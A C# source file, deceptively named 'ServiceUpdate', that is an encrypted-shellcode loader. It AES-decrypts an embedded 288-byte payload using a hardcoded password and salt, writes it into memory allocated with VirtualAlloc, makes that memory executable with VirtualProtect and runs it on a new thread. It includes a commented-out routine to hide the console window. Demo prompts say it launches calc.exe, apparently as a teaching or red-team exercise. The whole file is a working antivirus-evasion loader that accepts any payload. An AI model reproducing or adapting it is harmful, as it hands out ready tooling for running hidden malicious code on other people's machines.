using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Security.Cryptography;

namespace ServiceUpdate
{
    class Update
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        const int SW_HIDE = 0;

        static void Main()
        {
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_READWRITE = 0x04;
            UInt32 PAGE_EXECUTE_READ = 0x20;

            //var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE);

            //SHELLCODE, SALT, PASSWORD ALL IS JUST C+P FROM CONSOLE OUTPUT OF ENCRYPTION APPLICATION: HERE
            byte[] aesshellcode = new byte[288] {0xe7,0x27,0xb8,0xde,0x91,0xf8,0x6b,0x84,0x9e,0x53,0x1b,0xb5,0x78,0xdc,0x3d,0x50,0x06,0x6d,0x55,0x0d,0x45,0x00,0x5c,0x9c,0xe9,0xfc,0x59,0x3f,0x8a,0xe9,0x76,0x79,0x99,0x87,0x3c,0xbd,0x3f,0x47,0xf0,0x51,0xb7,0xee,0x9e,0xe3,0x6b,0xf4,0xae,0x55,0x70,0x0c,0x54,0xa3,0xcb,0x77,0xde,0x98,0xc5,0x5a,0xea,0x76,0xb4,0x88,0x0d,0x53,0x91,0xe6,0xc4,0x7e,0x86,0x0e,0x3f,0x9b,0xe0,0xe1,0x38,0xc1,0x83,0x8e,0xe6,0x41,0x35,0x87,0xd9,0xd7,0xe6,0x7d,0x7d,0xbb,0x9b,0xf9,0x5c,0x5d,0x8b,0x4a,0x83,0xec,0xe3,0xa3,0x1b,0x16,0x8e,0x6f,0xe6,0x9c,0x28,0x53,0x22,0x31,0x7a,0x21,0xfc,0xa7,0x50,0x4b,0x43,0xb4,0x40,0xb8,0x44,0xe1,0xb3,0x3e,0xe3,0xae,0x25,0x07,0x26,0x71,0xcc,0xbc,0x00,0xda,0xf5,0x42,0x7e,0x6c,0x94,0xaa,0x41,0x0d,0x23,0x31,0x1c,0x63,0x55,0x34,0xd8,0x54,0x97,0x06,0x0f,0xb7,0x87,0xe0,0x0b,0x2f,0x84,0xfa,0x6f,0xf3,0x14,0xb5,0x9d,0xce,0x59,0xeb,0xfc,0x81,0xa0,0x2c,0x43,0x94,0x89,0xe0,0x5c,0x88,0xd6,0x22,0xc7,0x3e,0x0e,0x27,0x76,0xf0,0xf1,0x41,0xb1,0x12,0xd8,0x83,0x18,0x69,0xef,0x36,0xc2,0xee,0xe1,0x82,0xa0,0x59,0xdb,0x09,0x3c,0x29,0xec,0x19,0xf9,0xc2,0x66,0x82,0xf5,0xdb,0x48,0xce,0xd5,0x7c,0xa7,0xd8,0xd1,0x5d,0x20,0x47,0xaf,0x0b,0xc7,0x6f,0xf7,0x83,0x53,0x63,0xe9,0xd8,0xd1,0x34,0xd1,0xb9,0x95,0x38,0xde,0x2c,0x4b,0x20,0xb5,0xf4,0x1f,0x99,0x85,0x30,0x43,0x74,0xe7,0x5a,0x02,0x4e,0xe3,0xbb,0xe4,0x63,0xbb,0x9e,0xa4,0x9c,0x5e,0x33,0x6f,0x9f,0x3c,0x45,0x5b,0xf5,0xec,0xad,0xdb,0x17,0x11,0x4d,0x73,0x80,0x87,0xaa,0x83,0xbf,0x2e,0xc6,0xa5,0x57,0xb5,0x44};

            byte[] salt = new byte[] {93, 32, 119, 108, 35, 74, 66, 89, 113, 104, 230, 74, 237, 170, 138, 74};

            byte[] passwordBytes = Encoding.UTF8.GetBytes("derpderp");
            // TO HERE

            // CONVERT PASSWORD TO KEY
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            // ASSIGN BUFFER
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)aesshellcode.Length, MEM_COMMIT, PAGE_READWRITE);

            // Assuming aesshellcode is a byte array and funcAddr is an IntPtr

            unsafe
            {
                fixed (byte* ptr = aesshellcode)
                {
                    Console.WriteLine(String.Format("{0,-20} : 0x{1}", "payload is stored at:", ((IntPtr)ptr).ToString("x")));
                }
                Console.WriteLine(String.Format("{0,-20} : 0x{1}", "memory allocated at:", funcAddr.ToString("x")));
            }

            Console.WriteLine("Hit enter to continue!");
            Console.ReadLine();


            // CALL DECRYPTION FUNCTION
            byte[] service = AES_Decrypt(aesshellcode, passwordBytes, salt);

                        unsafe
            {
                fixed (byte* ptr = service)
                {
                    Console.WriteLine(String.Format("{0,-20} : 0x{1}", "decrypted shellcode is stored at:", ((IntPtr)ptr).ToString("x")));
                }
            }

            Console.WriteLine("Hit enter to continue!");
            Console.ReadLine();

            Marshal.Copy(service, 0, funcAddr, service.Length);

            Console.WriteLine("Decrypted shellcode has been injected into buffer.");
            Console.WriteLine("Hit enter to continue!");
            Console.ReadLine();

            UInt32 oldProtect;
            VirtualProtect(funcAddr, (UInt32)service.Length, PAGE_EXECUTE_READ, out oldProtect);

            Console.WriteLine("Memory protection constant has been updated.");
            Console.WriteLine("Hit enter to continue to launch calc.exe!");
            Console.ReadLine();

            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }


        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes, byte[] salt)
        {
            byte[] decryptedBytes = null;

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

    }
}